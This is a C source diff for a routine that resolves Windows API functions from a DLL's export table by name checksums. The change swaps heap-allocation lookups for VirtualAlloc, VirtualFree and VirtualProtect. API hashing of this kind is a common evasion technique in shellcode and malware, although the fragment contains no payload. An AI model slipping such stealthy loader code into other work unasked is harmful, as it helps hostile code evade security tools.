@@ -1,7 +1,8 @@
+#include <stdio.h>
+
 #include "checksum.h"
 #include "checksum_list.h"
 #include "function_list.h"
-#include <stdio.h>
 
 static void memzero(void *start, uint32_t size);
 
@@ -21,6 +22,11 @@ int fill_function_list(IMAGE_EXPORT_DIRECTORY *ed, void *base,
         void *function_addr = (void *)((
             void **)((uint8_t *)base + *(addr_ptr + *name_ordinals_ptr)));
 
+        /*printf("name = %s | ord = %d | addr = 0x%p\n",
+               (const char *)(uint8_t *)base + *name_ptr,
+               *(uint16_t *)((uint8_t *)base + *name_ordinals_ptr),
+               (void *)((uint8_t *)function_addr - (uint8_t *)base));*/
+
         switch (checksum((const char *)base + *name_ptr)) {
         case CS_EXITPROCESS:
             function_list->exit_process = (fpExitProcess)function_addr;
@@ -28,14 +34,14 @@ int fill_function_list(IMAGE_EXPORT_DIRECTORY *ed, void *base,
         case CS_GETTICKCOUNT:
             function_list->get_tick_count = (fpGetTickCount)function_addr;
             break;
-        case CS_GETPROCESSHEAP:
-            function_list->get_process_heap = (fpGetProcessHeap)function_addr;
+        case CS_VIRTUALALLOC:
+            function_list->virtual_alloc = (fpVirualAlloc)function_addr;
             break;
-        case CS_HEAPALLOC:
-            function_list->heap_alloc = (fpHeapAlloc)function_addr;
+        case CS_VIRTUALFREE:
+            function_list->virtual_free = (fpVirtualFree)function_addr;
             break;
-        case CS_HEAPFREE:
-            function_list->heap_free = (fpHeapFree)function_addr;
+        case CS_VIRTUALPROTECT:
+            function_list->virtual_protect = (fpVirtualProtect)function_addr;
             break;
         case CS_FINDFIRSTFILEA:
             function_list->find_first_file_a = (fpFindFirstFileA)function_addr;
